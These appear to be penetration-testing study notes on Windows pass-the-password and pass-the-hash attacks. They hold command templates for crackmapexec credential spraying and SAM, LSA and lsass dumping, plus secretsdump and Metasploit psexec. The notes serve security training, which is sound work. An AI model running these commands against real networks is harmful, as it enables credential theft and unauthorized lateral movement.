## Pass Attacks Overview
- Pass the Password and Pass the Hash
- If we dump a password from SAM or crack a password, we can leverage it to pass around the network
- This is used for lateral movement in the network

### Pass the Password
- We can use crackmapexec to pass the password: `crackmapexec smb <ip/CIDR? -u <user> -d <domain> -p <pass>`
- Does this user have a successful login or local admin anywhere else?
- Look for `(Pwn3d!)`

### Pass the Hash
- Use metasploit: `exploit/windows/smb/psexec` or secretsdump: `secretsdump.py <domain>/<user>:<password>@<ip>` to run a hashdump
- Pass it: `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`

### More from crackmapexec
- Dump some data: `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
- Enumerate shares: `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares`
- Dump the LSA: `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
- Built in modules `crackmapexec smb -L`
- Dump the lsass: `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy`
- CME DB: `cmedb`
